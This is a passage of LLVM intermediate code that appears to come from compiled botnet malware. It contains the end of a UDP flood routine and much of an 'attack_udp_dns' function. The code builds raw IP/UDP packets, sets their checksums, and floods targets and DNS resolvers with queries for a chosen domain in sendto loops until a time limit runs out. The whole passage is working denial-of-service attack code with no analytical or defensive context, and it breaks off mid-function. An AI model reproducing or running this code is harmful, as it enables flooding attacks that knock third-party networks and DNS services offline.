  %90 = getelementptr inbounds i8, i8* %85, i64 1
  store i8 %12, i8* %90, align 1
  %91 = load i32, i32* %7, align 4
  %92 = trunc i32 %91 to i16
  %93 = add i16 %92, 32
  %94 = call zeroext i16 @htons(i16 zeroext %93) #11
  %95 = getelementptr inbounds i8, i8* %85, i64 2
  %96 = bitcast i8* %95 to i16*
  store i16 %94, i16* %96, align 2
  %97 = call zeroext i16 @htons(i16 zeroext %14) #11
  %98 = getelementptr inbounds i8, i8* %85, i64 4
  %99 = bitcast i8* %98 to i16*
  store i16 %97, i16* %99, align 4
  %100 = getelementptr inbounds i8, i8* %85, i64 8
  store i8 %16, i8* %100, align 4
  %101 = call zeroext i16 @htons(i16 zeroext 16384) #11
  %102 = getelementptr inbounds i8, i8* %85, i64 6
  %103 = bitcast i8* %102 to i16*
  store i16 %101, i16* %103, align 2
  %104 = getelementptr inbounds i8, i8* %85, i64 9
  store i8 17, i8* %104, align 1
  %105 = load i32, i32* @LOCAL_ADDR, align 4
  %106 = getelementptr inbounds i8, i8* %85, i64 12
  %107 = bitcast i8* %106 to i32*
  store i32 %105, i32* %107, align 4
  %108 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %2, i64 %86, i32 1
  %109 = load i32, i32* %108, align 4
  %110 = getelementptr inbounds i8, i8* %85, i64 16
  %111 = bitcast i8* %110 to i32*
  store i32 %109, i32* %111, align 4
  %112 = call zeroext i16 @htons(i16 zeroext %20) #11
  %113 = bitcast i8* %88 to i16*
  store i16 %112, i16* %113, align 2
  %114 = call zeroext i16 @htons(i16 zeroext %22) #11
  %115 = getelementptr inbounds i8, i8* %85, i64 22
  %116 = bitcast i8* %115 to i16*
  store i16 %114, i16* %116, align 2
  %117 = add i16 %92, 12
  %118 = call zeroext i16 @htons(i16 zeroext %117) #11
  %119 = getelementptr inbounds i8, i8* %85, i64 24
  %120 = bitcast i8* %119 to i16*
  store i16 %118, i16* %120, align 2
  %121 = bitcast i8* %89 to i32*
  store i32 -1, i32* %121, align 4
  %122 = getelementptr inbounds i8, i8* %85, i64 32
  call void @util_memcpy(i8* %122, i8* %26, i32 %91)
  %123 = load i32, i32* %6, align 4
  %124 = add nsw i32 %123, 1
  store i32 %124, i32* %6, align 4
  %125 = icmp slt i32 %124, %33
  br i1 %125, label %.lr.ph75.split, label %.preheader.loopexit92

; <label>:126:                                    ; preds = %.preheader, %._crit_edge
  store i32 0, i32* %6, align 4
  br i1 %34, label %._crit_edge, label %.lr.ph

.lr.ph:                                           ; preds = %126
  br i1 %78, label %.lr.ph.split.us.preheader, label %.lr.ph.split.preheader

.lr.ph.split.preheader:                           ; preds = %.lr.ph
  br label %.lr.ph.split

.lr.ph.split.us.preheader:                        ; preds = %.lr.ph
  br label %.lr.ph.split.us

.lr.ph.split.us:                                  ; preds = %.lr.ph.split.us.preheader, %152
  %127 = phi i32 [ %173, %152 ], [ 0, %.lr.ph.split.us.preheader ]
  %128 = sext i32 %127 to i64
  %129 = getelementptr inbounds i8*, i8** %10, i64 %128
  %130 = load i8*, i8** %129, align 8
  %131 = bitcast i8* %130 to %struct.iphdr*
  %132 = getelementptr inbounds i8, i8* %130, i64 20
  %133 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %2, i64 %128, i32 2
  %134 = load i8, i8* %133, align 4
  %135 = icmp ult i8 %134, 32
  br i1 %135, label %136, label %143

; <label>:136:                                    ; preds = %.lr.ph.split.us
  %137 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %2, i64 %128, i32 1
  %138 = load i32, i32* %137, align 4
  %139 = call i32 @ntohl(i32 %138) #11
  %140 = call i32 @htonl(i32 %139) #11
  %141 = getelementptr inbounds i8, i8* %130, i64 16
  %142 = bitcast i8* %141 to i32*
  store i32 %140, i32* %142, align 4
  br label %143

; <label>:143:                                    ; preds = %.lr.ph.split.us, %136
  %144 = getelementptr inbounds i8, i8* %130, i64 4
  %145 = bitcast i8* %144 to i16*
  store i16 0, i16* %145, align 4
  br i1 %80, label %146, label %148

; <label>:146:                                    ; preds = %143
  %147 = bitcast i8* %132 to i16*
  store i16 0, i16* %147, align 2
  br label %148

; <label>:148:                                    ; preds = %146, %143
  %149 = getelementptr inbounds i8, i8* %130, i64 22
  %150 = bitcast i8* %149 to i16*
  br i1 %82, label %151, label %._crit_edge80

._crit_edge80:                                    ; preds = %148
  %.pre83 = load i16, i16* %150, align 2
  br label %152

; <label>:151:                                    ; preds = %148
  store i16 0, i16* %150, align 2
  br label %152

; <label>:152:                                    ; preds = %._crit_edge80, %151
  %153 = phi i16 [ %.pre83, %._crit_edge80 ], [ 0, %151 ]
  %154 = getelementptr inbounds i8, i8* %130, i64 10
  %155 = bitcast i8* %154 to i16*
  store i16 0, i16* %155, align 2
  %156 = bitcast i8* %130 to i16*
  %157 = call zeroext i16 @checksum_generic(i16* %156, i32 20)
  store i16 %157, i16* %155, align 2
  %158 = getelementptr inbounds i8, i8* %130, i64 26
  %159 = bitcast i8* %158 to i16*
  store i16 0, i16* %159, align 2
  %160 = getelementptr inbounds i8, i8* %130, i64 24
  %161 = bitcast i8* %160 to i16*
  %162 = load i16, i16* %161, align 2
  %163 = load i32, i32* %7, align 4
  %164 = add i32 %163, 12
  %165 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* nonnull %131, i8* nonnull %132, i16 zeroext %162, i32 %164)
  store i16 %165, i16* %159, align 2
  %166 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %2, i64 %128, i32 0, i32 1
  store i16 %153, i16* %166, align 2
  %167 = sext i32 %163 to i64
  %168 = add nsw i64 %167, 32
  %169 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %2, i64 %128, i32 0
  %170 = bitcast %struct.sockaddr_in* %169 to %struct.sockaddr*
  %171 = call i64 @sendto(i32 %27, i8* nonnull %130, i64 %168, i32 16384, %struct.sockaddr* %170, i32 16) #10
  %172 = load i32, i32* %6, align 4
  %173 = add nsw i32 %172, 1
  store i32 %173, i32* %6, align 4
  %174 = icmp slt i32 %173, %33
  br i1 %174, label %.lr.ph.split.us, label %._crit_edge.loopexit

.lr.ph.split:                                     ; preds = %.lr.ph.split.preheader, %198
  %175 = phi i32 [ %219, %198 ], [ 0, %.lr.ph.split.preheader ]
  %176 = sext i32 %175 to i64
  %177 = getelementptr inbounds i8*, i8** %10, i64 %176
  %178 = load i8*, i8** %177, align 8
  %179 = bitcast i8* %178 to %struct.iphdr*
  %180 = getelementptr inbounds i8, i8* %178, i64 20
  %181 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %2, i64 %176, i32 2
  %182 = load i8, i8* %181, align 4
  %183 = icmp ult i8 %182, 32
  br i1 %183, label %184, label %191

; <label>:184:                                    ; preds = %.lr.ph.split
  %185 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %2, i64 %176, i32 1
  %186 = load i32, i32* %185, align 4
  %187 = call i32 @ntohl(i32 %186) #11
  %188 = call i32 @htonl(i32 %187) #11
  %189 = getelementptr inbounds i8, i8* %178, i64 16
  %190 = bitcast i8* %189 to i32*
  store i32 %188, i32* %190, align 4
  br label %191

; <label>:191:                                    ; preds = %.lr.ph.split, %184
  br i1 %80, label %192, label %194

; <label>:192:                                    ; preds = %191
  %193 = bitcast i8* %180 to i16*
  store i16 0, i16* %193, align 2
  br label %194

; <label>:194:                                    ; preds = %192, %191
  %195 = getelementptr inbounds i8, i8* %178, i64 22
  %196 = bitcast i8* %195 to i16*
  br i1 %82, label %197, label %._crit_edge78

._crit_edge78:                                    ; preds = %194
  %.pre = load i16, i16* %196, align 2
  br label %198

; <label>:197:                                    ; preds = %194
  store i16 0, i16* %196, align 2
  br label %198

; <label>:198:                                    ; preds = %._crit_edge78, %197
  %199 = phi i16 [ %.pre, %._crit_edge78 ], [ 0, %197 ]
  %200 = getelementptr inbounds i8, i8* %178, i64 10
  %201 = bitcast i8* %200 to i16*
  store i16 0, i16* %201, align 2
  %202 = bitcast i8* %178 to i16*
  %203 = call zeroext i16 @checksum_generic(i16* %202, i32 20)
  store i16 %203, i16* %201, align 2
  %204 = getelementptr inbounds i8, i8* %178, i64 26
  %205 = bitcast i8* %204 to i16*
  store i16 0, i16* %205, align 2
  %206 = getelementptr inbounds i8, i8* %178, i64 24
  %207 = bitcast i8* %206 to i16*
  %208 = load i16, i16* %207, align 2
  %209 = load i32, i32* %7, align 4
  %210 = add i32 %209, 12
  %211 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* nonnull %179, i8* nonnull %180, i16 zeroext %208, i32 %210)
  store i16 %211, i16* %205, align 2
  %212 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %2, i64 %176, i32 0, i32 1
  store i16 %199, i16* %212, align 2
  %213 = sext i32 %209 to i64
  %214 = add nsw i64 %213, 32
  %215 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %2, i64 %176, i32 0
  %216 = bitcast %struct.sockaddr_in* %215 to %struct.sockaddr*
  %217 = call i64 @sendto(i32 %27, i8* nonnull %178, i64 %214, i32 16384, %struct.sockaddr* %216, i32 16) #10
  %218 = load i32, i32* %6, align 4
  %219 = add nsw i32 %218, 1
  store i32 %219, i32* %6, align 4
  %220 = icmp slt i32 %219, %33
  br i1 %220, label %.lr.ph.split, label %._crit_edge.loopexit91

._crit_edge.loopexit:                             ; preds = %152
  br label %._crit_edge

._crit_edge.loopexit91:                           ; preds = %198
  br label %._crit_edge

._crit_edge:                                      ; preds = %._crit_edge.loopexit91, %._crit_edge.loopexit, %126
  %221 = call i64 @time(i64* null) #10
  %222 = icmp sgt i64 %221, %83
  br i1 %222, label %.loopexit.loopexit, label %126

.loopexit.loopexit:                               ; preds = %._crit_edge
  br label %.loopexit

.loopexit:                                        ; preds = %.loopexit.loopexit, %5, %75
  ret void
}

; Function Attrs: noinline nounwind uwtable
define void @attack_udp_dns(i32, i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option* nocapture readonly) #0 {
  %6 = alloca i32, align 4
  store i32 0, i32* %6, align 4
  %7 = zext i8 %1 to i64
  %8 = tail call noalias i8* @calloc(i64 %7, i64 8) #10
  %9 = bitcast i8* %8 to i8**
  %10 = tail call i32 @attack_get_opt_int(i8 zeroext %3, %struct.attack_option* %4, i8 zeroext 2, i32 0)
  %11 = trunc i32 %10 to i8
  %12 = tail call i32 @attack_get_opt_int(i8 zeroext %3, %struct.attack_option* %4, i8 zeroext 3, i32 65535)
  %13 = trunc i32 %12 to i16
  %14 = tail call i32 @attack_get_opt_int(i8 zeroext %3, %struct.attack_option* %4, i8 zeroext 4, i32 64)
  %15 = trunc i32 %14 to i8
  %16 = tail call i32 @attack_get_opt_int(i8 zeroext %3, %struct.attack_option* %4, i8 zeroext 5, i32 0)
  %17 = trunc i32 %16 to i8
  %18 = tail call i32 @attack_get_opt_int(i8 zeroext %3, %struct.attack_option* %4, i8 zeroext 6, i32 65535)
  %19 = trunc i32 %18 to i16
  %20 = tail call i32 @attack_get_opt_int(i8 zeroext %3, %struct.attack_option* %4, i8 zeroext 7, i32 53)
  %21 = trunc i32 %20 to i16
  %22 = tail call i32 @attack_get_opt_int(i8 zeroext %3, %struct.attack_option* %4, i8 zeroext 9, i32 65535)
  %23 = trunc i32 %22 to i16
  %24 = tail call i32 @attack_get_opt_int(i8 zeroext %3, %struct.attack_option* %4, i8 zeroext 0, i32 12)
  %25 = trunc i32 %24 to i8
  %26 = tail call i8* @attack_get_opt_str(i8 zeroext %3, %struct.attack_option* %4, i8 zeroext 8, i8* null)
  %27 = tail call fastcc i32 @get_dns_resolver()
  %28 = tail call i64 @time(i64* null) #10
  %29 = zext i32 %0 to i64
  %30 = add i64 %28, %29
  %31 = icmp eq i8* %26, null
  br i1 %31, label %.loopexit, label %32

; <label>:32:                                     ; preds = %5
  %33 = tail call i32 @util_strlen(i8* nonnull %26)
  %34 = tail call i32 @socket(i32 2, i32 3, i32 17) #10
  %35 = icmp eq i32 %34, -1
  br i1 %35, label %.loopexit, label %36

; <label>:36:                                     ; preds = %32
  store i32 1, i32* %6, align 4
  %37 = bitcast i32* %6 to i8*
  %38 = call i32 @setsockopt(i32 %34, i32 0, i32 3, i8* nonnull %37, i32 4) #10
  %39 = icmp eq i32 %38, -1
  br i1 %39, label %116, label %.preheader126

.preheader126:                                    ; preds = %36
  store i32 0, i32* %6, align 4
  %40 = zext i8 %1 to i32
  %41 = icmp eq i8 %1, 0
  %.pre = and i32 %24, 255
  %.pre144 = zext i32 %.pre to i64
  %.pre146 = sext i32 %33 to i64
  %.pre148 = add nuw nsw i64 %.pre144, 47
  %.pre150 = add nsw i64 %.pre148, %.pre146
  br i1 %41, label %.preheader, label %.lr.ph136

.lr.ph136:                                        ; preds = %.preheader126
  %42 = trunc i64 %.pre150 to i16
  %43 = icmp eq i8 %17, 0
  %44 = add nuw nsw i64 %.pre144, 27
  %45 = add nsw i64 %44, %.pre146
  %46 = trunc i64 %45 to i16
  %47 = add nsw i32 %33, 1
  %48 = icmp sgt i32 %33, 0
  %wide.trip.count = zext i32 %33 to i64
  br i1 %43, label %.lr.ph136.split.us.preheader, label %.lr.ph136.split.preheader

.lr.ph136.split.preheader:                        ; preds = %.lr.ph136
  %xtraiter159 = and i64 %wide.trip.count, 1
  %lcmp.mod160 = icmp eq i64 %xtraiter159, 0
  %49 = icmp eq i32 %33, 1
  br label %.lr.ph136.split

.lr.ph136.split.us.preheader:                     ; preds = %.lr.ph136
  %xtraiter = and i64 %wide.trip.count, 1
  %lcmp.mod = icmp eq i64 %xtraiter, 0
  %50 = icmp eq i32 %33, 1
  br label %.lr.ph136.split.us

.lr.ph136.split.us:                               ; preds = %.lr.ph136.split.us.preheader, %._crit_edge134.us
  %51 = phi i32 [ %103, %._crit_edge134.us ], [ 0, %.lr.ph136.split.us.preheader ]
  %52 = call noalias i8* @calloc(i64 600, i64 1) #10
  %53 = sext i32 %51 to i64
  %54 = getelementptr inbounds i8*, i8** %9, i64 %53
  store i8* %52, i8** %54, align 8
  %55 = getelementptr inbounds i8, i8* %52, i64 20
  %56 = getelementptr inbounds i8, i8* %52, i64 28
  %57 = getelementptr inbounds i8, i8* %52, i64 40
  store i8 69, i8* %52, align 4
  %58 = getelementptr inbounds i8, i8* %52, i64 1
  store i8 %11, i8* %58, align 1
  %59 = call zeroext i16 @htons(i16 zeroext %42) #11
  %60 = getelementptr inbounds i8, i8* %52, i64 2
  %61 = bitcast i8* %60 to i16*
  store i16 %59, i16* %61, align 2
  %62 = call zeroext i16 @htons(i16 zeroext %13) #11
  %63 = getelementptr inbounds i8, i8* %52, i64 4
  %64 = bitcast i8* %63 to i16*
  store i16 %62, i16* %64, align 4
  %65 = getelementptr inbounds i8, i8* %52, i64 8
  store i8 %15, i8* %65, align 4
  %66 = getelementptr inbounds i8, i8* %52, i64 9
  store i8 17, i8* %66, align 1
  %67 = load i32, i32* @LOCAL_ADDR, align 4
  %68 = getelementptr inbounds i8, i8* %52, i64 12
  %69 = bitcast i8* %68 to i32*
  store i32 %67, i32* %69, align 4
  %70 = getelementptr inbounds i8, i8* %52, i64 16
  %71 = bitcast i8* %70 to i32*
  store i32 %27, i32* %71, align 4
  %72 = call zeroext i16 @htons(i16 zeroext %19) #11
  %73 = bitcast i8* %55 to i16*
  store i16 %72, i16* %73, align 2
  %74 = call zeroext i16 @htons(i16 zeroext %21) #11
  %75 = getelementptr inbounds i8, i8* %52, i64 22
  %76 = bitcast i8* %75 to i16*
  store i16 %74, i16* %76, align 2
  %77 = call zeroext i16 @htons(i16 zeroext %46) #11
  %78 = getelementptr inbounds i8, i8* %52, i64 24
  %79 = bitcast i8* %78 to i16*
  store i16 %77, i16* %79, align 2
  %80 = call zeroext i16 @htons(i16 zeroext %23) #11
  %81 = bitcast i8* %56 to i16*
  store i16 %80, i16* %81, align 2
  %82 = call zeroext i16 @htons(i16 zeroext 256) #11
  %83 = getelementptr inbounds i8, i8* %52, i64 30
  %84 = bitcast i8* %83 to i16*
  store i16 %82, i16* %84, align 2
  %85 = call zeroext i16 @htons(i16 zeroext 1) #11
  %86 = getelementptr inbounds i8, i8* %52, i64 32
  %87 = bitcast i8* %86 to i16*
  store i16 %85, i16* %87, align 2
  %88 = getelementptr inbounds i8, i8* %52, i64 41
  store i8 %25, i8* %57, align 1
  %89 = getelementptr inbounds i8, i8* %88, i64 %.pre144
  %90 = getelementptr inbounds i8, i8* %89, i64 1
  call void @util_memcpy(i8* %90, i8* nonnull %26, i32 %47)
  br i1 %48, label %.lr.ph133.us.preheader, label %._crit_edge134.us

.lr.ph133.us.preheader:                           ; preds = %.lr.ph136.split.us
  br i1 %lcmp.mod, label %.lr.ph133.us.prol.loopexit.unr-lcssa, label %.lr.ph133.us.prol.preheader

.lr.ph133.us.prol.preheader:                      ; preds = %.lr.ph133.us.preheader
  br label %.lr.ph133.us.prol

.lr.ph133.us.prol:                                ; preds = %.lr.ph133.us.prol.preheader
  %91 = load i8, i8* %26, align 1
  %92 = icmp eq i8 %91, 46
  br i1 %92, label %94, label %93

; <label>:93:                                     ; preds = %.lr.ph133.us.prol
  br label %96

; <label>:94:                                     ; preds = %.lr.ph133.us.prol
  store i8 0, i8* %89, align 1
  %95 = getelementptr inbounds i8, i8* %89, i64 1
  br label %96

; <label>:96:                                     ; preds = %94, %93
  %.1123.us.prol = phi i8* [ %95, %94 ], [ %89, %93 ]
  %.1.us.prol = phi i8 [ 0, %94 ], [ 1, %93 ]
  br label %.lr.ph133.us.prol.loopexit.unr-lcssa

.lr.ph133.us.prol.loopexit.unr-lcssa:             ; preds = %.lr.ph133.us.preheader, %96
  %.1123.us.lcssa.unr.ph = phi i8* [ %.1123.us.prol, %96 ], [ undef, %.lr.ph133.us.preheader ]
  %.1.us.lcssa.unr.ph = phi i8 [ %.1.us.prol, %96 ], [ undef, %.lr.ph133.us.preheader ]
  %indvars.iv.unr.ph = phi i64 [ 1, %96 ], [ 0, %.lr.ph133.us.preheader ]
  %.0119130.us.unr.ph = phi i8 [ %.1.us.prol, %96 ], [ 0, %.lr.ph133.us.preheader ]
  %.0122128.us.unr.ph = phi i8* [ %.1123.us.prol, %96 ], [ %89, %.lr.ph133.us.preheader ]
  br label %.lr.ph133.us.prol.loopexit

.lr.ph133.us.prol.loopexit:                       ; preds = %.lr.ph133.us.prol.loopexit.unr-lcssa
  br i1 %50, label %._crit_edge134.us.loopexit, label %.lr.ph133.us.preheader.new

.lr.ph133.us.preheader.new:                       ; preds = %.lr.ph133.us.prol.loopexit
  br label %.lr.ph133.us

._crit_edge134.us.loopexit.unr-lcssa:             ; preds = %289
  br label %._crit_edge134.us.loopexit

._crit_edge134.us.loopexit:                       ; preds = %.lr.ph133.us.prol.loopexit, %._crit_edge134.us.loopexit.unr-lcssa
  %.1123.us.lcssa = phi i8* [ %.1123.us.lcssa.unr.ph, %.lr.ph133.us.prol.loopexit ], [ %.1123.us.1, %._crit_edge134.us.loopexit.unr-lcssa ]
  %.1.us.lcssa = phi i8 [ %.1.us.lcssa.unr.ph, %.lr.ph133.us.prol.loopexit ], [ %.1.us.1, %._crit_edge134.us.loopexit.unr-lcssa ]
  br label %._crit_edge134.us

._crit_edge134.us:                                ; preds = %._crit_edge134.us.loopexit, %.lr.ph136.split.us
  %.0122.lcssa.us = phi i8* [ %89, %.lr.ph136.split.us ], [ %.1123.us.lcssa, %._crit_edge134.us.loopexit ]
  %.0119.lcssa.us = phi i8 [ 0, %.lr.ph136.split.us ], [ %.1.us.lcssa, %._crit_edge134.us.loopexit ]
  store i8 %.0119.lcssa.us, i8* %.0122.lcssa.us, align 1
  %97 = getelementptr inbounds i8, i8* %89, i64 %.pre146
  %98 = getelementptr inbounds i8, i8* %97, i64 2
  %99 = bitcast i8* %98 to i16*
  store i16 %85, i16* %99, align 2
  %100 = getelementptr inbounds i8, i8* %98, i64 2
  %101 = bitcast i8* %100 to i16*
  store i16 %85, i16* %101, align 2
  %102 = load i32, i32* %6, align 4
  %103 = add nsw i32 %102, 1
  store i32 %103, i32* %6, align 4
  %104 = icmp slt i32 %103, %40
  br i1 %104, label %.lr.ph136.split.us, label %.preheader.loopexit

.lr.ph133.us:                                     ; preds = %289, %.lr.ph133.us.preheader.new
  %indvars.iv = phi i64 [ %indvars.iv.unr.ph, %.lr.ph133.us.preheader.new ], [ %indvars.iv.next.1, %289 ]
  %.0119130.us = phi i8 [ %.0119130.us.unr.ph, %.lr.ph133.us.preheader.new ], [ %.1.us.1, %289 ]
  %.0122128.us = phi i8* [ %.0122128.us.unr.ph, %.lr.ph133.us.preheader.new ], [ %.1123.us.1, %289 ]
  %105 = getelementptr inbounds i8, i8* %26, i64 %indvars.iv
  %106 = load i8, i8* %105, align 1
  %107 = icmp eq i8 %106, 46
  br i1 %107, label %110, label %108

; <label>:108:                                    ; preds = %.lr.ph133.us
  %109 = add i8 %.0119130.us, 1
  br label %.lr.ph133.us.1158

; <label>:110:                                    ; preds = %.lr.ph133.us
  store i8 %.0119130.us, i8* %.0122128.us, align 1
  %111 = getelementptr inbounds i8, i8* %89, i64 %indvars.iv
  %112 = getelementptr inbounds i8, i8* %111, i64 1
  br label %.lr.ph133.us.1158

.lr.ph133.us.1158:                                ; preds = %110, %108
  %.1123.us = phi i8* [ %112, %110 ], [ %.0122128.us, %108 ]
  %.1.us = phi i8 [ 0, %110 ], [ %109, %108 ]
  %indvars.iv.next = add nuw nsw i64 %indvars.iv, 1
  %113 = getelementptr inbounds i8, i8* %26, i64 %indvars.iv.next
  %114 = load i8, i8* %113, align 1
  %115 = icmp eq i8 %114, 46
  br i1 %115, label %286, label %284

; <label>:116:                                    ; preds = %36
  %117 = call i32 @close(i32 %34) #10
  br label %.loopexit

.preheader.loopexit:                              ; preds = %._crit_edge134.us
  br label %.preheader

.preheader.loopexit157:                           ; preds = %._crit_edge134
  br label %.preheader

.preheader:                                       ; preds = %.preheader.loopexit157, %.preheader.loopexit, %.preheader126
  %118 = and i32 %12, 65535
  %119 = icmp eq i32 %118, 65535
  %120 = and i32 %18, 65535
  %121 = icmp eq i32 %120, 65535
  %122 = and i32 %20, 65535
  %123 = icmp eq i32 %122, 65535
  %124 = and i32 %22, 65535
  %125 = icmp eq i32 %124, 65535
  %126 = add nuw nsw i32 %.pre, 27
  %127 = add i32 %126, %33
  %sext = shl i64 %30, 32
  %128 = ashr exact i64 %sext, 32
  br label %197

.lr.ph136.split:                                  ; preds = %.lr.ph136.split.preheader, %._crit_edge134
  %129 = phi i32 [ %195, %._crit_edge134 ], [ 0, %.lr.ph136.split.preheader ]
  %130 = call noalias i8* @calloc(i64 600, i64 1) #10
  %131 = sext i32 %129 to i64
  %132 = getelementptr inbounds i8*, i8** %9, i64 %131
  store i8* %130, i8** %132, align 8
  %133 = getelementptr inbounds i8, i8* %130, i64 20
  %134 = getelementptr inbounds i8, i8* %130, i64 28
  %135 = getelementptr inbounds i8, i8* %130, i64 40
  store i8 69, i8* %130, align 4
  %136 = getelementptr inbounds i8, i8* %130, i64 1
  store i8 %11, i8* %136, align 1
  %137 = call zeroext i16 @htons(i16 zeroext %42) #11
  %138 = getelementptr inbounds i8, i8* %130, i64 2
  %139 = bitcast i8* %138 to i16*
  store i16 %137, i16* %139, align 2
  %140 = call zeroext i16 @htons(i16 zeroext %13) #11
  %141 = getelementptr inbounds i8, i8* %130, i64 4
  %142 = bitcast i8* %141 to i16*
  store i16 %140, i16* %142, align 4
  %143 = getelementptr inbounds i8, i8* %130, i64 8
  store i8 %15, i8* %143, align 4
  %144 = call zeroext i16 @htons(i16 zeroext 16384) #11
  %145 = getelementptr inbounds i8, i8* %130, i64 6
  %146 = bitcast i8* %145 to i16*
  store i16 %144, i16* %146, align 2
  %147 = getelementptr inbounds i8, i8* %130, i64 9
  store i8 17, i8* %147, align 1
  %148 = load i32, i32* @LOCAL_ADDR, align 4
  %149 = getelementptr inbounds i8, i8* %130, i64 12
  %150 = bitcast i8* %149 to i32*
  store i32 %148, i32* %150, align 4
  %151 = getelementptr inbounds i8, i8* %130, i64 16
  %152 = bitcast i8* %151 to i32*
  store i32 %27, i32* %152, align 4
  %153 = call zeroext i16 @htons(i16 zeroext %19) #11
  %154 = bitcast i8* %133 to i16*
  store i16 %153, i16* %154, align 2
  %155 = call zeroext i16 @htons(i16 zeroext %21) #11
  %156 = getelementptr inbounds i8, i8* %130, i64 22
  %157 = bitcast i8* %156 to i16*
  store i16 %155, i16* %157, align 2
  %158 = call zeroext i16 @htons(i16 zeroext %46) #11
  %159 = getelementptr inbounds i8, i8* %130, i64 24
  %160 = bitcast i8* %159 to i16*
  store i16 %158, i16* %160, align 2
  %161 = call zeroext i16 @htons(i16 zeroext %23) #11
  %162 = bitcast i8* %134 to i16*
  store i16 %161, i16* %162, align 2
  %163 = call zeroext i16 @htons(i16 zeroext 256) #11
  %164 = getelementptr inbounds i8, i8* %130, i64 30
  %165 = bitcast i8* %164 to i16*
  store i16 %163, i16* %165, align 2
  %166 = call zeroext i16 @htons(i16 zeroext 1) #11
  %167 = getelementptr inbounds i8, i8* %130, i64 32
  %168 = bitcast i8* %167 to i16*
  store i16 %166, i16* %168, align 2
  %169 = getelementptr inbounds i8, i8* %130, i64 41
  store i8 %25, i8* %135, align 1
  %170 = getelementptr inbounds i8, i8* %169, i64 %.pre144
  %171 = getelementptr inbounds i8, i8* %170, i64 1
  call void @util_memcpy(i8* %171, i8* nonnull %26, i32 %47)
  br i1 %48, label %.lr.ph133.preheader, label %._crit_edge134

.lr.ph133.preheader:                              ; preds = %.lr.ph136.split
  br i1 %lcmp.mod160, label %.lr.ph133.prol.loopexit.unr-lcssa, label %.lr.ph133.prol.preheader

.lr.ph133.prol.preheader:                         ; preds = %.lr.ph133.preheader
  br label %.lr.ph133.prol

.lr.ph133.prol:                                   ; preds = %.lr.ph133.prol.preheader
  %172 = load i8, i8* %26, align 1
  %173 = icmp eq i8 %172, 46
  br i1 %173, label %175, label %174

; <label>:174:                                    ; preds = %.lr.ph133.prol
  br label %177

; <label>:175:                                    ; preds = %.lr.ph133.prol
  store i8 0, i8* %170, align 1
  %176 = getelementptr inbounds i8, i8* %170, i64 1
  br label %177

; <label>:177:                                    ; preds = %175, %174
  %.1123.prol = phi i8* [ %176, %175 ], [ %170, %174 ]
  %.1.prol = phi i8 [ 0, %175 ], [ 1, %174 ]
  br label %.lr.ph133.prol.loopexit.unr-lcssa

.lr.ph133.prol.loopexit.unr-lcssa:                ; preds = %.lr.ph133.preheader, %177
  %.1123.lcssa.unr.ph = phi i8* [ %.1123.prol, %177 ], [ undef, %.lr.ph133.preheader ]
  %.1.lcssa.unr.ph = phi i8 [ %.1.prol, %177 ], [ undef, %.lr.ph133.preheader ]
  %indvars.iv140.unr.ph = phi i64 [ 1, %177 ], [ 0, %.lr.ph133.preheader ]
  %.0119130.unr.ph = phi i8 [ %.1.prol, %177 ], [ 0, %.lr.ph133.preheader ]
  %.0122128.unr.ph = phi i8* [ %.1123.prol, %177 ], [ %170, %.lr.ph133.preheader ]
  br label %.lr.ph133.prol.loopexit

.lr.ph133.prol.loopexit:                          ; preds = %.lr.ph133.prol.loopexit.unr-lcssa
  br i1 %49, label %._crit_edge134.loopexit, label %.lr.ph133.preheader.new

.lr.ph133.preheader.new:                          ; preds = %.lr.ph133.prol.loopexit
  br label %.lr.ph133

.lr.ph133:                                        ; preds = %295, %.lr.ph133.preheader.new
  %indvars.iv140 = phi i64 [ %indvars.iv140.unr.ph, %.lr.ph133.preheader.new ], [ %indvars.iv.next141.1, %295 ]
  %.0119130 = phi i8 [ %.0119130.unr.ph, %.lr.ph133.preheader.new ], [ %.1.1, %295 ]
  %.0122128 = phi i8* [ %.0122128.unr.ph, %.lr.ph133.preheader.new ], [ %.1123.1, %295 ]
  %178 = getelementptr inbounds i8, i8* %26, i64 %indvars.iv140
  %179 = load i8, i8* %178, align 1
  %180 = icmp eq i8 %179, 46
  br i1 %180, label %181, label %184

; <label>:181:                                    ; preds = %.lr.ph133
  store i8 %.0119130, i8* %.0122128, align 1
  %182 = getelementptr inbounds i8, i8* %170, i64 %indvars.iv140
  %183 = getelementptr inbounds i8, i8* %182, i64 1
  br label %.lr.ph133.1161

; <label>:184:                                    ; preds = %.lr.ph133
  %185 = add i8 %.0119130, 1
  br label %.lr.ph133.1161

.lr.ph133.1161:                                   ; preds = %181, %184
  %.1123 = phi i8* [ %183, %181 ], [ %.0122128, %184 ]
  %.1 = phi i8 [ 0, %181 ], [ %185, %184 ]
  %indvars.iv.next141 = add nuw nsw i64 %indvars.iv140, 1
  %186 = getelementptr inbounds i8, i8* %26, i64 %indvars.iv.next141
  %187 = load i8, i8* %186, align 1
  %188 = icmp eq i8 %187, 46
  br i1 %188, label %292, label %290

._crit_edge134.loopexit.unr-lcssa:                ; preds = %295
  br label %._crit_edge134.loopexit

._crit_edge134.loopexit:                          ; preds = %.lr.ph133.prol.loopexit, %._crit_edge134.loopexit.unr-lcssa
  %.1123.lcssa = phi i8* [ %.1123.lcssa.unr.ph, %.lr.ph133.prol.loopexit ], [ %.1123.1, %._crit_edge134.loopexit.unr-lcssa ]
  %.1.lcssa = phi i8 [ %.1.lcssa.unr.ph, %.lr.ph133.prol.loopexit ], [ %.1.1, %._crit_edge134.loopexit.unr-lcssa ]
  br label %._crit_edge134

._crit_edge134:                                   ; preds = %._crit_edge134.loopexit, %.lr.ph136.split
  %.0122.lcssa = phi i8* [ %170, %.lr.ph136.split ], [ %.1123.lcssa, %._crit_edge134.loopexit ]
  %.0119.lcssa = phi i8 [ 0, %.lr.ph136.split ], [ %.1.lcssa, %._crit_edge134.loopexit ]
  store i8 %.0119.lcssa, i8* %.0122.lcssa, align 1
  %189 = getelementptr inbounds i8, i8* %170, i64 %.pre146
